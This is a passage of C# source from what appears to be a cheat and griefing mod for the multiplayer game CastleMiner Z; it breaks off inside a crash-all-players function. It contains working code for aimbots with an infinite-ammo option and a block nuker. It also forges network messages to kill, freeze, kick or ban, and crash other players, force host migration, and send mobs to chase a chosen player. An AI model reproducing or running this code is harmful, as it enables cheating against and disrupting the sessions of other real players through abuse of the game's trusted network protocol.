            if (!_blockNukerEnabled)
                return;

            var game = CastleMinerZGame.Instance;

            if (game == null || !(game.MyNetworkGamer is LocalNetworkGamer from) || game.LocalPlayer == null)
                return;

            int range = Math.Max(0, _blockNukerRangeValue);

            if (range == 0)
                return;

            Vector3 localPos = game.LocalPlayer.LocalPosition;

            int centerX = (int)Math.Floor(localPos.X);
            int centerY = (int)Math.Floor(localPos.Y);
            int centerZ = (int)Math.Floor(localPos.Z);

            for (int x = -range; x <= range; x++)
            {
                for (int y = -range; y <= range; y++)
                {
                    for (int z = -range; z <= range; z++)
                    {
                        IntVector3 loc = new IntVector3(
                            centerX + x,
                            centerY + y,
                            centerZ + z);

                        if (InGameHUD.GetBlock(loc) != BlockTypeEnum.Empty)
                            AlterBlockMessage.Send(
                                from,
                                loc,
                                BlockTypeEnum.Empty);
                    }
                }
            }
        }
        #endregion

        #region UNUSED: Obsolete

        #region TICK: Player Aimbot

        /// <summary>
        /// Per-tick aimbot driver for player targets.
        /// - Input gate: Only runs while MMB is held (clears state otherwise).
        /// - Targeting: Picks the closest valid enemy (optionally LOS-gated).
        /// - Aiming:
        ///     * If not forcing the camera to face the enemy, tries ballistic aim when it makes sense
        ///       (guns that actually drop, toggle-controlled), else uses flat aim.
        ///     * If forcing face-towards-enemy, uses the current camera basis (keep behavior stable).
        /// - Grenades: Handled via a separate path; do not fall through to gun fire.
        /// - Cadence: Honors vanilla ROF unless a custom speed is provided.
        /// - Fire: Routes through TryFireWithAimMatrix to use the game's normal Shoot() pipeline.
        /// </summary>
        /// <param name="speed">
        /// Optional custom delay (ms) for rate limiting. null = use vanilla cooldown.
        /// </param>
        /// <param name="requireVisible">
        /// If true, AimTargeting ignores occluded targets (line-of-sight requirement).
        /// </param>
        /// <param name="faceTorwardsEnemy">
        /// If true, we keep the camera facing the target and build fireL2W from the view directly
        /// (skip ballistic correction unless you enable the commented block).
        /// </param>
        /// <param name="adjustForBulletDrop">
        /// Master toggle for ballistic correction on bullet weapons (ignored for lasers/rockets/grenades).
        /// </param>
        /// <param name="infiniteAmmo">
        /// If true, all weapons will fire regardless of ammo count (disabled by default).
        /// </param>
        /// <param name="enemyYOffset">
        /// Optional aim offset on the target (e.g., head height). Defaults to ~1.2 blocks up.
        /// </param>
        public static void PlayerAimbot(
            int?     speed               = null,
            bool     requireVisible      = false,
            bool     faceTorwardsEnemy   = false,
            bool     adjustForBulletDrop = false,
            bool     infiniteAmmo        = false,
            Vector3? enemyYOffset        = null
        )
        {
            // Input gate: Only run while MMB is held. Clear crosshair/target promptly when released.
            if (Mouse.GetState().MiddleButton != Microsoft.Xna.Framework.Input.ButtonState.Pressed)
            {
                AimbotController.Clear();
                return;
            }

            // Acquire a target (closest valid enemy). Respect LOS if requested.
            var targetGamer = AimTargeting.FindClosestValidPlayer(requireVisible);
            if (targetGamer == null) { AimbotController.Clear(); return; }

            // Defensive casts/early outs keep the per-tick path cheap and safe.
            if (!(targetGamer.Tag is Player target)) { AimbotController.Clear(); return; }

            var game = CastleMinerZGame.Instance;
            if (!(game.LocalPlayer.FPSCamera is PerspectiveCamera cam)) return;

            // Prime shared controller state used by other patches (e.g., face-towards, crosshair).
            AimbotController.ShowTargetCrosshair = true;
            AimbotController.FaceTorwardsEnemy   = faceTorwardsEnemy;
            AimbotController.Target              = target;
            AimbotController.Offset              = enemyYOffset ?? new Vector3(0f, 1.2f, 0f);

            // Active item drives both aim math (ballistic vs flat) and the fire path.
            var inv  = game.LocalPlayer.PlayerInventory;
            var item = inv.ActiveInventoryItem;
            if (item == null) return;

            // Build the orientation we'll shoot with.
            Matrix fireL2W;

            if (!faceTorwardsEnemy)
            {
                // Prefer ballistic aim for "real" bullets when enabled and supported by the item.
                // (Lasers/rockets/grenades are filtered inside ShouldApplyBulletDrop).
                bool useBallistics = AimbotBallistics.ShouldApplyBulletDrop(item, adjustForBulletDrop);
                if (useBallistics && item is GunInventoryItem gi &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, target, AimbotController.Offset, gi.GunClass, out fireL2W))
                {
                    // Success: fireL2W is gravity-compensated (low-arc solution).
                }
                // Fallback: Flat lead/roll solution. If that also fails, shoot straight down the view.
                else if (!AimMath.TryMakeAimL2W(
                             cam, target, AimbotController.Offset,
                             AimbotController.LeadSpeed, AimbotController.Roll, out fireL2W))
                {
                    fireL2W = Matrix.Invert(cam.View); // Safe, latency-free fallback.
                }
            }
            else
            {
                // "Face target" mode: Keep camera basis. (Stable feel; avoids camera pops.).
                // If you want ballistic correction even while facing, see the commented block below.
                fireL2W = Matrix.Invert(cam.View);

                /*
                bool useBallistics = ShouldApplyBulletDrop(item);
                if (useBallistics && gi != null &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, tgt, AimbotController.Offset, gi.GunClass, out fireL2W)) { }
                */
            }

            // Grenade path //
            if (item.ItemClass is GrenadeInventoryItemClass)
            {
                // Let the vanilla grenade throw pipeline send the message when the animation fires,
                // but supply a pre-aimed orientation once (TryThrowAtTarget handles ballistic vs flat).
                AimbotGrenades.TryThrowAtTarget(
                    AimbotController.Target,
                    AimbotController.Offset,
                    adjustForBulletDrop
                );
                return; // IMPORTANT: Do not also call gun/rocket fire below.
            }

            // Cadence / cooldown //
            // If no custom cadence was requested, mirror vanilla ROF timers so this plays nice in MP.
            var baseTimer = CooldownBridge.TryGetBaseTimer(item);
            if (speed == null)                   // Vanilla cadence.
            {
                if (!CooldownBridge.IsExpired(baseTimer))
                    return;                      // Too soon to fire again.
                CooldownBridge.Reset(baseTimer); // Align with vanilla rhythm.
            }
            else
            {
                // Custom cadence: Go through our limiter to throttle sends.
                if (!AimbotRateLimiter.TryConsume(item, speed))
                    return;
            }

            // Fire //
            // Route through the game's normal HUD.Shoot(..) using our computed fireL2W.
            // (This keeps ammo, recoil, tracers, and net replication consistent with vanilla.).
            AimbotFire.TryFireWithAimMatrix(fireL2W, infiniteAmmo);
        }
        #endregion

        #region TICK: Mob Aimbot

        /// <summary>
        /// Per-tick aimbot driver for entity targets.
        /// - Input gate: Only runs while MMB is held (clears state otherwise).
        /// - Targeting: Picks the closest valid enemy (optionally LOS-gated).
        /// - Aiming:
        ///     * If not forcing the camera to face the enemy, tries ballistic aim when it makes sense
        ///       (guns that actually drop, toggle-controlled), else uses flat aim.
        ///     * If forcing face-towards-enemy, uses the current camera basis (keep behavior stable).
        /// - Grenades: Handled via a separate path; do not fall through to gun fire.
        /// - Cadence: Honors vanilla ROF unless a custom speed is provided.
        /// - Fire: Routes through TryFireWithAimMatrix to use the game's normal Shoot() pipeline.
        /// </summary>
        /// <param name="speed">
        /// Optional custom delay (ms) for rate limiting. null = use vanilla cooldown.
        /// </param>
        /// <param name="requireVisible">
        /// If true, AimTargeting ignores occluded targets (line-of-sight requirement).
        /// </param>
        /// <param name="faceTorwardsEnemy">
        /// If true, we keep the camera facing the target and build fireL2W from the view directly
        /// (skip ballistic correction unless you enable the commented block).
        /// </param>
        /// <param name="adjustForBulletDrop">
        /// Master toggle for ballistic correction on bullet weapons (ignored for lasers/rockets/grenades).
        /// </param>
        /// <param name="infiniteAmmo">
        /// If true, all weapons will fire regardless of ammo count (disabled by default).
        /// </param>
        /// <param name="enemyYOffset">
        /// Optional aim offset on the target (e.g., head height). Defaults to ~1.2 blocks up.
        /// </param>
        public static void MobAimbot(
            int?     speed               = null,
            bool     requireVisible      = false,
            bool     faceTorwardsEnemy   = false,
            bool     adjustForBulletDrop = false,
            bool     infiniteAmmo        = false,
            Vector3? enemyYOffset        = null
        )
        {
            // Input gate: Only run while MMB is held. Clear crosshair/target promptly when released.
            if (Mouse.GetState().MiddleButton != Microsoft.Xna.Framework.Input.ButtonState.Pressed)
            {
                AimbotController.Clear();
                return;
            }

            // Acquire a target (closest valid enemy). Respect LOS if requested.
            var targetMob = AimTargeting.FindClosestValidMob(requireVisible);
            if (targetMob == null) { AimbotController.Clear(); return; }

            // Defensive casts/early outs keep the per-tick path cheap and safe.
            if (!(targetMob is BaseZombie tgt)) { AimbotController.Clear(); return; }

            var game = CastleMinerZGame.Instance;
            if (!(game.LocalPlayer.FPSCamera is PerspectiveCamera cam)) return;

            // Prime shared controller state used by other patches (e.g., face-towards, crosshair).
            AimbotController.ShowTargetCrosshair = true;
            AimbotController.FaceTorwardsEnemy   = faceTorwardsEnemy;
            AimbotController.Target              = tgt;
            AimbotController.Offset              = enemyYOffset ?? new Vector3(0f, 1.2f, 0f);

            // Active item drives both aim math (ballistic vs flat) and the fire path.
            var inv  = game.LocalPlayer.PlayerInventory;
            var item = inv.ActiveInventoryItem;
            if (item == null) return;

            // Build the orientation we'll shoot with.
            Matrix fireL2W;

            if (!faceTorwardsEnemy)
            {
                // Prefer ballistic aim for "real" bullets when enabled and supported by the item.
                // (Lasers/rockets/grenades are filtered inside ShouldApplyBulletDrop).
                bool useBallistics = AimbotBallistics.ShouldApplyBulletDrop(item, adjustForBulletDrop);
                if (useBallistics && item is GunInventoryItem gi &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, tgt, AimbotController.Offset, gi.GunClass, out fireL2W))
                {
                    // Success: fireL2W is gravity-compensated (low-arc solution).
                }
                // Fallback: Flat lead/roll solution. If that also fails, shoot straight down the view.
                else if (!AimMath.TryMakeAimL2W(
                             cam, tgt, AimbotController.Offset,
                             AimbotController.LeadSpeed, AimbotController.Roll, out fireL2W))
                {
                    fireL2W = Matrix.Invert(cam.View); // Safe, latency-free fallback.
                }
            }
            else
            {
                // "Face target" mode: Keep camera basis. (Stable feel; avoids camera pops.).
                // If you want ballistic correction even while facing, see the commented block below.
                fireL2W = Matrix.Invert(cam.View);

                /*
                bool useBallistics = ShouldApplyBulletDrop(item);
                if (useBallistics && gi != null &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, tgt, AimbotController.Offset, gi.GunClass, out fireL2W)) { }
                */
            }

            // Grenade path //
            if (item.ItemClass is GrenadeInventoryItemClass)
            {
                // Let the vanilla grenade throw pipeline send the message when the animation fires,
                // but supply a pre-aimed orientation once (TryThrowAtTarget handles ballistic vs flat).
                AimbotGrenades.TryThrowAtTarget(
                    AimbotController.Target,
                    AimbotController.Offset,
                    adjustForBulletDrop
                );
                return; // IMPORTANT: Do not also call gun/rocket fire below.
            }

            // Cadence / cooldown //
            // If no custom cadence was requested, mirror vanilla ROF timers so this plays nice in MP.
            var baseTimer = CooldownBridge.TryGetBaseTimer(item);
            if (speed == null)                   // Vanilla cadence.
            {
                if (!CooldownBridge.IsExpired(baseTimer))
                    return;                      // Too soon to fire again.
                CooldownBridge.Reset(baseTimer); // Align with vanilla rhythm.
            }
            else
            {
                // Custom cadence: Go through our limiter to throttle sends.
                if (!AimbotRateLimiter.TryConsume(item, speed))
                    return;
            }

            // Fire //
            // Route through the game's normal HUD.Shoot(..) using our computed fireL2W.
            // (This keeps ammo, recoil, tracers, and net replication consistent with vanilla.).
            AimbotFire.TryFireWithAimMatrix(fireL2W, infiniteAmmo);
        }
        #endregion

        #region TICK: Dragon Aimbot

        /// <summary>
        /// Per-tick aimbot driver for dragon targets.
        /// - Input gate: Only runs while MMB is held (clears state otherwise).
        /// - Targeting: Picks the closest valid enemy (optionally LOS-gated).
        /// - Aiming:
        ///     * If not forcing the camera to face the enemy, tries ballistic aim when it makes sense
        ///       (guns that actually drop, toggle-controlled), else uses flat aim.
        ///     * If forcing face-towards-enemy, uses the current camera basis (keep behavior stable).
        /// - Grenades: Handled via a separate path; do not fall through to gun fire.
        /// - Cadence: Honors vanilla ROF unless a custom speed is provided.
        /// - Fire: Routes through TryFireWithAimMatrix to use the game's normal Shoot() pipeline.
        /// </summary>
        /// <param name="speed">
        /// Optional custom delay (ms) for rate limiting. null = use vanilla cooldown.
        /// </param>
        /// <param name="requireVisible">
        /// If true, AimTargeting ignores occluded targets (line-of-sight requirement).
        /// </param>
        /// <param name="faceTorwardsEnemy">
        /// If true, we keep the camera facing the target and build fireL2W from the view directly
        /// (skip ballistic correction unless you enable the commented block).
        /// </param>
        /// <param name="adjustForBulletDrop">
        /// Master toggle for ballistic correction on bullet weapons (ignored for lasers/rockets/grenades).
        /// </param>
        /// <param name="infiniteAmmo">
        /// If true, all weapons will fire regardless of ammo count (disabled by default).
        /// </param>
        /// <param name="enemyYOffset">
        /// Optional aim offset on the target (e.g., head height). Defaults to ~1.2 blocks up.
        /// </param>
        public static void DragonAimbot(
            int?     speed               = null,
            bool     requireVisible      = false,
            bool     faceTorwardsEnemy   = false,
            bool     adjustForBulletDrop = false,
            bool     infiniteAmmo        = false,
            Vector3? enemyYOffset        = null
        )
        {
            // Input gate: Only run while MMB is held. Clear crosshair/target promptly when released.
            if (Mouse.GetState().MiddleButton != Microsoft.Xna.Framework.Input.ButtonState.Pressed)
            {
                AimbotController.Clear();
                return;
            }

            // Acquire a target (closest valid enemy). Respect LOS if requested.
            var targetDragon = AimTargeting.FindClosestValidDragon(requireVisible);
            if (targetDragon == null) { AimbotController.Clear(); return; }

            // Defensive casts/early outs keep the per-tick path cheap and safe.
            if (!(targetDragon is DragonEntity tgt)) { AimbotController.Clear(); return; }

            var game = CastleMinerZGame.Instance;
            if (!(game.LocalPlayer.FPSCamera is PerspectiveCamera cam)) return;

            // Prime shared controller state used by other patches (e.g., face-towards, crosshair).
            AimbotController.ShowTargetCrosshair = true;
            AimbotController.FaceTorwardsEnemy   = faceTorwardsEnemy;
            AimbotController.Target              = tgt;
            AimbotController.Offset              = enemyYOffset ?? new Vector3(0f, 1.2f, 0f);

            // Active item drives both aim math (ballistic vs flat) and the fire path.
            var inv  = game.LocalPlayer.PlayerInventory;
            var item = inv.ActiveInventoryItem;
            if (item == null) return;

            // Build the orientation we'll shoot with.
            Matrix fireL2W;

            if (!faceTorwardsEnemy)
            {
                // Prefer ballistic aim for "real" bullets when enabled and supported by the item.
                // (Lasers/rockets/grenades are filtered inside ShouldApplyBulletDrop).
                bool useBallistics = AimbotBallistics.ShouldApplyBulletDrop(item, adjustForBulletDrop);
                if (useBallistics && item is GunInventoryItem gi &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, tgt, AimbotController.Offset, gi.GunClass, out fireL2W))
                {
                    // Success: fireL2W is gravity-compensated (low-arc solution).
                }
                // Fallback: Flat lead/roll solution. If that also fails, shoot straight down the view.
                else if (!AimMath.TryMakeAimL2W(
                             cam, tgt, AimbotController.Offset,
                             AimbotController.LeadSpeed, AimbotController.Roll, out fireL2W))
                {
                    fireL2W = Matrix.Invert(cam.View); // Safe, latency-free fallback.
                }
            }
            else
            {
                // "Face target" mode: Keep camera basis. (Stable feel; avoids camera pops.).
                // If you want ballistic correction even while facing, see the commented block below.
                fireL2W = Matrix.Invert(cam.View);

                /*
                bool useBallistics = ShouldApplyBulletDrop(item);
                if (useBallistics && gi != null &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, tgt, AimbotController.Offset, gi.GunClass, out fireL2W)) { }
                */
            }

            // Grenade path //
            if (item.ItemClass is GrenadeInventoryItemClass)
            {
                // Let the vanilla grenade throw pipeline send the message when the animation fires,
                // but supply a pre-aimed orientation once (TryThrowAtTarget handles ballistic vs flat).
                AimbotGrenades.TryThrowAtTarget(
                    AimbotController.Target,
                    AimbotController.Offset,
                    adjustForBulletDrop
                );
                return; // IMPORTANT: Do not also call gun/rocket fire below.
            }

            // Cadence / cooldown //
            // If no custom cadence was requested, mirror vanilla ROF timers so this plays nice in MP.
            var baseTimer = CooldownBridge.TryGetBaseTimer(item);
            if (speed == null)                   // Vanilla cadence.
            {
                if (!CooldownBridge.IsExpired(baseTimer))
                    return;                      // Too soon to fire again.
                CooldownBridge.Reset(baseTimer); // Align with vanilla rhythm.
            }
            else
            {
                // Custom cadence: Go through our limiter to throttle sends.
                if (!AimbotRateLimiter.TryConsume(item, speed))
                    return;
            }

            // Fire //
            // Route through the game's normal HUD.Shoot(..) using our computed fireL2W.
            // (This keeps ammo, recoil, tracers, and net replication consistent with vanilla.).
            AimbotFire.TryFireWithAimMatrix(fireL2W, infiniteAmmo);
        }
        #endregion

        #endregion

        #endregion

        #region Typed Accessor Patches

        // Create typed accessors once.
        public static readonly AccessTools.FieldRef<EnemyManager, List<BaseZombie>> EnemiesRef      =
            AccessTools.FieldRefAccess<EnemyManager, List<BaseZombie>>("_enemies");

        public static readonly AccessTools.FieldRef<EnemyManager, DragonEntity>     DragonEntityRef =
            AccessTools.FieldRefAccess<EnemyManager, DragonEntity>("_dragon");

        public static readonly AccessTools.FieldRef<InventoryItem, OneShotTimer>    CooldownRef     =
            AccessTools.FieldRefAccess<InventoryItem, OneShotTimer>("_coolDownTimer");

        public static readonly AccessTools.FieldRef<Player, float>                  SprintMultRef   =
            AccessTools.FieldRefAccess<Player, float>("_sprintMultiplier");

        // Send private messages to DNA.CastleMinerZ.Net calls.
        // Moved to a dedicated MessageBridge class.

        #endregion

        #region Mod Functions

        #region Shared Functions

        internal static bool IsInGame()
        {
            var g = CastleMinerZGame.Instance;
            return g != null && g?.GameScreen != null && g?.CurrentNetworkSession != null;
        }

        public static void GivePlayerItems(LocalNetworkGamer from, NetworkGamer to, InventoryItemIDs itemID, int amount)
        {
            var sendInstance             = MessageBridge.Get<ConsumePickupMessage>();
            sendInstance.PickupPosition  = ((Player)to?.Tag)?.LocalPosition ?? Vector3.Zero;
            sendInstance.Item            = InventoryItem.CreateItem(itemID, amount);
            sendInstance.PickerUpper     = to.Id;
            sendInstance.SpawnerID       = 0;
            sendInstance.PickupID        = 0;
            sendInstance.DisplayOnPickup = false;

            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }

        public static void ForceHostMigration(byte newHostId)
        {
            CastleMinerZGame.Instance.CurrentNetworkSession.AllowHostMigration = true;
            AppointServerMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, newHostId);
            CastleMinerZGame.Instance.CurrentNetworkSession.AllowHostMigration = false;
        }

        public static void RestartLevelPrivate(LocalNetworkGamer from, NetworkGamer to)
        {
            var sendInstance = MessageBridge.Get<RestartLevelMessage>();
            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }

        public static void TpToSelectedPlayer(NetworkGamer gamer)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer == gamer)                                           // Match the selected gamer.
                    {
                        CastleMinerZGame.Instance.GameScreen.TeleportToLocation(((Player)gamer?.Tag)?.LocalPosition ?? Vector3.Zero, false);
                        break;
                    }
        }
        
        public static void PlayerExistsPrivate(LocalNetworkGamer from, NetworkGamer to, bool requestResponse)
        {
            var sendInstance                   = MessageBridge.Get<PlayerExistsMessage>();
            sendInstance.AvatarDescriptionData = new byte[10];
            sendInstance.RequestResponse       = requestResponse;
            sendInstance.Gamer.Gamertag        = from.Gamertag;
            sendInstance.Gamer.PlayerID        = from.PlayerID;

            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }
        #endregion

        #region Spawn Mobs Functions

        public static void SpawnMob(NetworkGamer gamer, EnemyTypeEnum enemyTypeEnum, int amount = 1, int offset = 0, bool samePos = false)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (((Player)networkGamer.Tag).Gamer == gamer)                                               // Match the selected gamer.
                {
                    Player p = (Player)networkGamer.Tag;

                    // If "samePos", pick once and reuse for all spawns.
                    Vector3 sharedPos = default;
                    if (samePos)
                        sharedPos = ComputeSpawnPos(p, offset);

                    for (int i = 0; i < amount; i++)
                    {
                        // Generate a random mob id.
                        int randomMobID = GenerateRandomNumberInclusive(0, 999999);

                        Vector3 spawnPos = samePos
                            ? sharedPos
                            : ComputeSpawnPos(p, offset);

                        // Spawn the custom enemy via SpawnEnemyMessage().
                        SpawnEnemyMessage.Send((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer,
                            spawnPos, enemyTypeEnum, 1f, randomMobID, 0, p?.LocalPosition ?? Vector3.Zero, 0, p.Gamer.Gamertag);

                        // Make this enemy target the targeted player.
                        EnemiesRef(EnemyManager.Instance).ForEach(delegate (BaseZombie baseZombie)
                        {
                            // Check for the summoned mob via our custom id.
                            if (baseZombie.EnemyID == randomMobID)
                            {
                                baseZombie.Target              = (Player)p.Gamer.Tag;
                                baseZombie.PlayerDistanceLimit = int.MaxValue;
                            }
                        });
                    }
                }

            #region Helpers

            Vector3 ComputeSpawnPos(Player p, int spawnOffset)
            {
                // Original behavior for offset == 0.
                if (spawnOffset <= 0)
                    return p?.LocalPosition ?? Vector3.Zero;

                // Valid ring spawn (scan ground + headroom).
                if (TryPickValidSpawnPosOnRing(p, spawnOffset, out var pos))
                    return pos;

                // Fallback.
                return p?.LocalPosition ?? Vector3.Zero;
            }
            #endregion
        }

        public static void SpawnMobAtPos(NetworkGamer gamer, EnemyTypeEnum enemyTypeEnum, Vector3 position, int amount = 1)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (((Player)networkGamer.Tag).Gamer == gamer)                                               // Match the selected gamer.
                {
                    Player p = (Player)networkGamer.Tag;

                    for (int i = 0; i < amount; i++)
                    {
                        // Generate a random mob id.
                        int randomMobID = GenerateRandomNumber(0, 999999);

                        // Spawn the custom enemy via SpawnEnemyMessage().
                        SpawnEnemyMessage.Send((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer,
                            position, enemyTypeEnum, 1f, randomMobID, 0, p?.LocalPosition ?? Vector3.Zero, 0, p.Gamer.Gamertag);

                        // Make this enemy target the targeted player.
                        EnemiesRef(EnemyManager.Instance).ForEach(delegate (BaseZombie baseZombie)
                        {
                            // Check for the summoned mob via our custom id.
                            if (baseZombie.EnemyID == randomMobID)
                            {
                                baseZombie.Target              = (Player)p.Gamer.Tag;
                                baseZombie.PlayerDistanceLimit = int.MaxValue;
                            }
                        });
                    }
                }
        }

        public static int TpAllMobsToCursor(NetworkGamer networkGamer)
        {
            Player p = (Player)networkGamer.Tag;
            Vector3 cursorPos   = InGameHUD.Instance?.ConstructionProbe?._worldIndex ?? Vector3.Zero;
                    cursorPos.Y += 1;

            // Move all existing enemies to the cursor and target the targeted player.
            int enemyCount = 0;
            EnemiesRef(EnemyManager.Instance).ForEach(delegate (BaseZombie baseZombie)
            {
                baseZombie.LocalPosition       = cursorPos;
                baseZombie.Target              = (Player)p.Gamer.Tag;
                baseZombie.PlayerDistanceLimit = int.MaxValue;
                enemyCount++;
            });
            return enemyCount;
        }
        #endregion

        #region Kick Player Functions

        private static void KickSelectedPlayer(NetworkGamer gamer, bool banned = false)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers)  // Iterate through all network gamers.
                // if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                              // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer == gamer)                                            // Match the selected gamer.
                    {
                        KickPlayerPrivate(CastleMinerZGame.Instance.MyNetworkGamer, gamer, banned);
                        break;
                    }
        }

        public static void KickPlayerPrivate(LocalNetworkGamer from, NetworkGamer to, bool banned = false)
        {
            // Define the send instance message type.
            var sendInstance = MessageBridge.Get<KickMessage>();
            sendInstance.PlayerID = to.Id;
            sendInstance.Banned   = banned;
            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }
        #endregion

        #region Kill Player Functions

        public static void KillSelectedPlayer(NetworkGamer gamer)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers)  // Iterate through all network gamers.
                // if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                              // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer == gamer)                                            // Match the selected gamer.
                    {
                        if (((Player)networkGamer.Tag).ValidLivingGamer)                                      // Ensure the gamer is alive.
                            if (((Player)networkGamer.Tag).Gamer == CastleMinerZGame.Instance.MyNetworkGamer) // Use 'KillPlayer()' to target ourselves.
                            {
                                InGameHUD.Instance.KillPlayer();
                            }
                            else                                                                              // Send damage packet.
                                for (int i = 0; i < 10; i++)
                                    SendFireballDamagePrivate(CastleMinerZGame.Instance.MyNetworkGamer, ((Player)networkGamer.Tag).Gamer, DragonTypeEnum.SKELETON);
                        break;
                    }
        }

        public static void KillAllPlayers()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (((Player)networkGamer.Tag).ValidLivingGamer)                                         // Ensure the gamer is alive.
                        for (int i = 0; i < 10; i++)                                                         // Send damage packet.
                            SendFireballDamagePrivate(CastleMinerZGame.Instance.MyNetworkGamer, ((Player)networkGamer.Tag).Gamer, DragonTypeEnum.SKELETON);
            // if (!_godEnabled) InGameHUD.Instance.KillPlayer();
        }

        public static void SendMeleeDamagePrivate(LocalNetworkGamer from, NetworkGamer to, InventoryItemIDs itemID = InventoryItemIDs.BloodStoneLaserSword)
        {
            var sendInstance    = MessageBridge.Get<MeleePlayerMessage>();
            sendInstance.ItemID = itemID;
            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }

        public static void SendFireballDamagePrivate(LocalNetworkGamer from, NetworkGamer to, DragonTypeEnum dragonType = DragonTypeEnum.SKELETON)
        {
            var sendInstance            = MessageBridge.Get<DetonateFireballMessage>();
            sendInstance.Location       = ((Player)to?.Tag)?.LocalPosition ?? Vector3.Zero;
            sendInstance.Index          = -1;
            sendInstance.NumBlocks      = 0;
            sendInstance.BlocksToRemove = new IntVector3[] { };
            sendInstance.EType          = dragonType;
            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }
        #endregion

        #region Freeze Player Functions

        public static void FreezeSelectedPlayer(NetworkGamer gamer)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer == gamer)                                           // Match the selected gamer.
                    {
                        SendFreezePackets(((Player)networkGamer.Tag).Gamer);
                        break;
                    }
        }

        public static void FreezeAllPlayers()
        {
            // 1) Freeze all non-host players.
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (!((Player)networkGamer.Tag).Gamer.IsHost)                                            // Ensure the gamer is not the host.
                    {
                        SendFreezePackets(((Player)networkGamer.Tag).Gamer);
                        break;
                    }

            // 2) Freeze host last.
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer.IsHost)                                             // Ensure the gamer is not the host.
                    {
                        SendFreezePackets(((Player)networkGamer.Tag).Gamer);
                        break;
                    }
        }

        public static void SendFreezePackets(NetworkGamer gamer)
        {
            Vector3 playersLocation = ((Player)gamer?.Tag)?.LocalPosition ?? Vector3.Zero;
            Vector3 shootLocation   = new Vector3(playersLocation.X, float.MinValue, playersLocation.Z);
            Matrix  shootMatrix     = Matrix.CreateLookAt(playersLocation, playersLocation, shootLocation);

            SendPrivateShotgunShotMessage(CastleMinerZGame.Instance.MyNetworkGamer, ((Player)gamer.Tag).Gamer, shootMatrix, InventoryItemIDs.Pistol);
        }

        private static void SendPrivateShotgunShotMessage(LocalNetworkGamer from, NetworkGamer to, Matrix m, InventoryItemIDs item)
        {
            var sendInstance = MessageBridge.Get<ShotgunShotMessage>();

            // Vector3[] directions = new Vector3[5];
            Angle        innacuracy = Angle.Zero;

            for (int i = 0; i < 5; i++)
            {
                Vector3 vector             = m.Forward;
                Matrix matrix              = Matrix.CreateRotationX(MathTools.RandomFloat(-innacuracy.Radians, innacuracy.Radians));
                matrix                    *= Matrix.CreateRotationY(MathTools.RandomFloat(-innacuracy.Radians, innacuracy.Radians));
                vector                     = Vector3.TransformNormal(vector, matrix);
                sendInstance.Directions[i] = Vector3.Normalize(vector);
            }
            sendInstance.ItemID  = item;

            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }
        #endregion

        #region Crash Player Functions

        public static void CrashSelectedPlayer(NetworkGamer gamer)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                // if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                             // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer == gamer)                                           // Match the selected gamer.
                    {
                        SendCrashPackets(((Player)networkGamer.Tag).Gamer);
                        break;
                    }
        }

        public static void CrashAllPlayers()
        {
            // 1) Crash all non-host players.
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (!((Player)networkGamer.Tag).Gamer.IsHost)                                            // Ensure the gamer is not the host.
                    {
                        SendCrashPackets(((Player)networkGamer.Tag).Gamer);
                        break;
                    }

            // 2) Crash host last.
